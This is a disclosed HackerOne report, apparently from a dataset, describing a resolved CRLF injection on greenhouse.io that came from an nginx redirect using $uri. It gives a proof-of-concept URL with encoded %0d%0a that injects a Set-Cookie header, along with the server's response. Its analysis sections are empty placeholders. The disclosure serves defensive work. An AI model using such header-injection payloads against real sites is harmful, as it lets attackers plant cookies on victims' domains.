---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '25275'
original_report_id: '25275'
title: '[greenhouse.io] CRLF Injection / Insecure nginx configuration'
team_handle: greenhouse
created_at: '2014-08-19T17:45:21.490Z'
disclosed_at: '2016-11-02T13:27:21.114Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
---

# [greenhouse.io] CRLF Injection / Insecure nginx configuration

## Metadata

- HackerOne Report ID: 25275
- Weakness: 
- Program: greenhouse
- Disclosed At: 2016-11-02T13:27:21.114Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC
http://greenhouse.io/%0d%0aSet-Cookie:test=test;domain=.greenhouse.io

HTTP Response:
Location: http://www.greenhouse.io/
Set-Cookie:test=test;domain=.greenhouse.io

Result: 
Creating cookie test=test on .greenhouse.io

$uri or $document_uri is used  in the redirection-URL.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
